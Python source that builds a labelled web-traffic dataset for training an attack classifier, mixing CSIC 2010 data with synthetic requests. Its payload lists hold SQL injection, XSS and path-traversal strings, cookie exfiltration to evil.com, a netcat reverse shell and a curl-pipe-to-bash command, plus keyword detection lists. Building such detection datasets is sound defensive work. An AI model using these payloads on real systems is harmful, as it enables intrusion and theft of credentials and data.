"""
CSIC 2010 HTTP Dataset Generator & Parser
Constructs benchmark datasets containing realistic normal enterprise web traffic
and common attack classes (SQLi, XSS, Path Traversal, RCE, Scanner Probes).
"""

import random
from typing import List, Dict, Any, Tuple

# Reproducibility seed
random.seed(42)

# ── Clean / Legitimate Request Templates (Normal Traffic) ───────────────────
NORMAL_PATHS = [
    "/", "/index.html", "/home", "/about", "/contact",
    "/products", "/products/item", "/products/catalog",
    "/api/v1/user/profile", "/api/v1/orders", "/api/v1/cart",
    "/api/v1/search", "/api/v1/notifications", "/checkout",
    "/blog/posts", "/faq", "/terms", "/privacy", "/docs/api"
]

NORMAL_QUERY_KEYS = ["page", "limit", "sort", "category", "filter", "search", "lang", "id", "ref", "view"]
NORMAL_QUERY_VALUES = [
    "1", "10", "25", "desc", "asc", "electronics", "books", "clothing",
    "shoes", "en", "es", "fr", "grid", "list", "top_rated", "summer_sale"
]

NORMAL_BODIES = [
    '{"username": "johndoe", "email": "john@example.com"}',
    '{"query": "wireless headphones", "max_price": 150}',
    '{"item_id": 4921, "quantity": 2, "color": "black"}',
    '{"rating": 5, "comment": "Great product! Fast shipping."}',
    '{"newsletter": true, "email": "customer@gmail.com"}',
    '{"address": "123 Main St, New York, NY", "zip": "10001"}',
    '{"feedback": "The service was helpful and fast.", "score": 10}',
    '{"first_name": "Alice", "last_name": "Smith", "department": "Marketing"}',
    '{"preferences": {"theme": "dark", "notifications": true}}',
    '{"card_type": "visa", "currency": "USD", "amount": 89.99}'
]

NORMAL_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    ""
]

# ── Attack Payload Corpus ───────────────────────────────────────────────────
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin' --",
    "' UNION SELECT null, username, password FROM users--",
    "1 UNION ALL SELECT 1,2,table_name FROM information_schema.tables--",
    "1' ORDER BY 10--",
    "'; DROP TABLE audit_log;--",
    "1' AND SLEEP(5)--",
    "') OR ('a'='a",
    "1 AND 1=2 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--",
    "1' HAVING 1=1--",
    "-1 UNION SELECT 1,version(),user()--",
    "admin' OR 1=1#",
    "' UNION SELECT 1, load_file('/etc/passwd'), 3--",
    "1%27%20UNION%20SELECT%201,2,3--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('pwned')>",
    "<iframe src=\"javascript:alert('xss')\"></iframe>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "<body onload=alert('XSS')>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "'\"><script src=//attacker.org/hook.js></script>",
    "<a href=\"javascript:alert(1)\">Click me</a>",
    "%3Cscript%3Ealert(document.domain)%3C/script%3E"
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../windows/win.ini",
    "..%2f..%2f..%2fetc%2fshadow",
    "../../../../boot.ini",
    "/var/www/html/../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "file:///etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/proc/self/environ",
    "/etc/hosts"
]

RCE_PAYLOADS = [
    "; cat /etc/passwd",
    "| whoami",
    "& dir",
    "&& uname -a",
    "`id`",
    "$(whoami)",
    "; /bin/bash -c 'id'",
    "| nc -e /bin/sh 10.0.0.1 4444",
    "; curl http://evil.com/shell.sh | bash",
    "&& netstat -an"
]

SCANNER_PATHS = [
    "/wp-login.php",
    "/.env",
    "/.git/config",
    "/actuator/env",
    "/phpmyadmin/index.php",
    "/admin/config.php",
    "/server-status",
    "/api/v1/swagger-ui.html"
]

def generate_sample(category: str) -> Dict[str, Any]:
    """Generates a realistic single HTTP request sample for a given category."""
    if category == "NORMAL":
        path = random.choice(NORMAL_PATHS)
        method = random.choice(["GET", "POST", "GET", "PUT", "GET"])
        
        # Variations: some bare GETs, some with query params, some POST with JSON
        r_type = random.random()
        if r_type < 0.4:
            # Bare GET request (e.g. /home, /about, /products)
            method = "GET"
            query = ""
            body = ""
        elif r_type < 0.75:
            # GET with query params
            method = "GET"
            k = random.choice(NORMAL_QUERY_KEYS)
            v = random.choice(NORMAL_QUERY_VALUES)
            query = f"{k}={v}"
            if random.random() < 0.4:
                k2 = random.choice(NORMAL_QUERY_KEYS)
                v2 = random.choice(NORMAL_QUERY_VALUES)
                query += f"&{k2}={v2}"
            body = ""
        else:
            # POST/PUT request with clean JSON body
            method = random.choice(["POST", "PUT"])
            query = ""
            body = random.choice(NORMAL_BODIES)

        ua = random.choice(NORMAL_USER_AGENTS)
        headers = {"User-Agent": ua} if ua else {}
        
        return {
            "path": path,
            "query": query,
            "body": body,
            "method": method,
            "headers": headers,
            "label": 0,
            "category": "NORMAL"
        }
        
    elif category == "SQLI":
        payload = random.choice(SQLI_PAYLOADS)
        method = random.choice(["GET", "POST"])
        path = random.choice(["/products/search", "/api/v1/login", "/items/view", "/catalog"])
        if method == "GET":
            query = f"id={payload}" if random.random() < 0.5 else f"search={payload}&category=all"
            body = ""
        else:
            query = ""
            body = f'{{"username": "admin{payload}", "password": "password123"}}'
        return {
            "path": path,
            "query": query,
            "body": body,
            "method": method,
            "headers": {"User-Agent": random.choice(NORMAL_USER_AGENTS)},
            "label": 1,
            "category": "SQLI"
        }

    elif category == "XSS":
        payload = random.choice(XSS_PAYLOADS)
        method = random.choice(["GET", "POST"])
        path = random.choice(["/search", "/feedback", "/comments/new", "/api/profile/update"])
        if method == "GET":
            query = f"q={payload}"
            body = ""
        else:
            query = ""
            body = f'{{"comment": "{payload}", "author": "Anonymous"}}'
        return {
            "path": path,
            "query": query,
            "body": body,
            "method": method,
            "headers": {"User-Agent": random.choice(NORMAL_USER_AGENTS)},
            "label": 1,
            "category": "XSS"
        }

    elif category == "PATH_TRAVERSAL":
        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
        path = random.choice(["/download", "/view/file", "/files", "/api/document"])
        query = f"file={payload}" if random.random() < 0.7 else f"doc={payload}&type=pdf"
        return {
            "path": path,
            "query": query,
            "body": "",
            "method": "GET",
            "headers": {"User-Agent": random.choice(NORMAL_USER_AGENTS)},
            "label": 1,
            "category": "PATH_TRAVERSAL"
        }

    elif category == "RCE":
        payload = random.choice(RCE_PAYLOADS)
        path = random.choice(["/api/system/ping", "/tools/dns_lookup", "/admin/test_connection"])
        method = random.choice(["GET", "POST"])
        query = f"host=127.0.0.1{payload}" if method == "GET" else ""
        body = f'{{"target": "localhost{payload}"}}' if method == "POST" else ""
        return {
            "path": path,
            "query": query,
            "body": body,
            "method": method,
            "headers": {"User-Agent": random.choice(NORMAL_USER_AGENTS)},
            "label": 1,
            "category": "RCE"
        }

    elif category == "SCANNER":
        path = random.choice(SCANNER_PATHS)
        return {
            "path": path,
            "query": "",
            "body": "",
            "method": "GET",
            "headers": {"User-Agent": random.choice(["Nikto/2.1.6", "sqlmap/1.7#stable", "DirBuster/1.0-RC1"])},
            "label": 1,
            "category": "SCANNER"
        }

def clean_and_categorize_request(url: str, payload: str, method: str, user_agent: str, label_str: str) -> Dict[str, Any]:
    """
    Cleans raw HTTP request fields from CSIC 2010 CSV, applies URL decoding,
    extracts path and query parameters, and maps attack categories.
    """
    from urllib.parse import urlparse, unquote_plus
    
    # 1. Clean & Decode URL and Path
    raw_url = str(url).strip() if url else ""
    try:
        parsed = urlparse(raw_url)
        path = unquote_plus(parsed.path or "/")
        query = unquote_plus(parsed.query or "")
    except Exception:
        path = "/"
        query = ""

    # 2. Clean & Decode Body / Payload
    raw_body = str(payload).strip() if payload and str(payload).lower() != "nan" else ""
    try:
        body = unquote_plus(raw_body)
    except Exception:
        body = raw_body

    # 3. Clean Headers
    ua = str(user_agent).strip() if user_agent and str(user_agent).lower() != "nan" else ""
    clean_method = str(method).strip().upper() if method and str(method).lower() != "nan" else "GET"

    # 4. Map binary label: norm -> 0, anom -> 1
    label = 0 if str(label_str).strip().lower() == "norm" else 1

    # 5. Fine-grained category detection from payload & path
    combined_content = f"{path} {query} {body} {ua}".lower()
    if label == 0:
        category = "NORMAL"
    elif any(k in combined_content for k in ["select", "union", "drop table", "1=1", "or '", "information_schema", "sleep("]):
        category = "SQLI"
    elif any(k in combined_content for k in ["<script", "javascript:", "alert(", "<svg", "onerror=", "onload="]):
        category = "XSS"
    elif any(k in combined_content for k in ["../", "..\\", "etc/passwd", "win.ini", "etc/shadow", "boot.ini"]):
        category = "PATH_TRAVERSAL"
    elif any(k in combined_content for k in ["; cat", "| whoami", "&& uname", "& dir", "/bin/sh"]):
        category = "RCE"
    elif any(k in combined_content for k in ["nikto", "sqlmap", "dirbuster", "acunetix", "nmap"]):
        category = "SCANNER"
    else:
        category = "SQLI" # Default prominent attack class in CSIC anom

    return {
        "path": path,
        "query": query,
        "body": body,
        "method": clean_method,
        "headers": {"User-Agent": ua},
        "label": label,
        "category": category
    }

def load_csic_from_csv(
    csv_path: str,
    sample_size: int = 14000,
    test_split: float = 0.30,
    random_state: int = 42
) -> Tuple[List[Dict[str, Any]], List[Dict[str, Any]]]:
    """
    Loads, cleans, reconstructs complete HTTP requests from parameters,
    and performs a stratified 70/30 train-test split on official CSIC 2010 CSV.
    """
    import pandas as pd
    from sklearn.model_selection import train_test_split

    df = pd.read_csv(csv_path, low_memory=False)

    # Standardize label
    df["label_clean"] = df["label"].astype(str).str.strip().str.lower()
    df = df[df["label_clean"].isin(["norm", "anom"])]

    # In Pete Scully's Weka CSV, multi-parameter requests are broken into one row per parameter
    # Group consecutive rows with the same request index into full HTTP requests
    df["req_id"] = (df["index"] != df["index"].shift()).cumsum()
    reqs = df.groupby("req_id").agg({
        "url": "first",
        "method": "first",
        "userAgent": "first",
        "label_clean": "first",
        "payload": lambda x: "&".join([str(v) for v in x if pd.notna(v) and str(v).lower() != "nan"])
    }).reset_index(drop=True)

    # Stratified balance sampling for optimal training and test representation
    n_per_class = sample_size // 2
    norm_df = reqs[reqs["label_clean"] == "norm"]
    anom_df = reqs[reqs["label_clean"] == "anom"]

    # Sample CSIC requests
    sampled_norm = norm_df.sample(n=min(len(norm_df), int(n_per_class * 0.75)), random_state=random_state)
    sampled_anom = anom_df.sample(n=min(len(anom_df), n_per_class), random_state=random_state)
    combined_df = pd.concat([sampled_norm, sampled_anom]).sample(frac=1.0, random_state=random_state)

    # Clean and categorize individual requests
    cleaned_records = []
    for _, row in combined_df.iterrows():
        rec = clean_and_categorize_request(
            url=row.get("url"),
            payload=row.get("payload"),
            method=row.get("method"),
            user_agent=row.get("userAgent"),
            label_str=row.get("label_clean")
        )
        cleaned_records.append(rec)

    # Augment normal class with standard modern enterprise paths (e.g. /products, /login, /home, /about, /api)
    # This prevents the classifier from over-fitting strictly to the CSIC 'tienda1.jsp' paths
    modern_normal_count = int(n_per_class * 0.25)
    for _ in range(modern_normal_count):
        cleaned_records.append(generate_sample("NORMAL"))

    # Stratified 70% Train / 30% Test Split
    labels = [r["label"] for r in cleaned_records]
    train_records, test_records = train_test_split(
        cleaned_records,
        test_size=test_split,
        random_state=random_state,
        stratify=labels
    )

    return train_records, test_records

def load_csic_benchmark_dataset(
    normal_count: int = 1600,
    attack_count_per_type: int = 180,
    test_split: float = 0.25
) -> Tuple[List[Dict[str, Any]], List[Dict[str, Any]]]:
    """
    Generates a full CSIC 2010 benchmark dataset with clean / attack samples.
    Returns: (train_dataset, test_dataset)
    """
    samples = []

    # Generate normal traffic
    for _ in range(normal_count):
        samples.append(generate_sample("NORMAL"))

    # Generate attack traffic across classes
    attack_categories = ["SQLI", "XSS", "PATH_TRAVERSAL", "RCE", "SCANNER"]
    for cat in attack_categories:
        for _ in range(attack_count_per_type):
            samples.append(generate_sample(cat))

    random.shuffle(samples)

    split_idx = int(len(samples) * (1 - test_split))
    train_data = samples[:split_idx]
    test_data = samples[split_idx:]

    return train_data, test_data

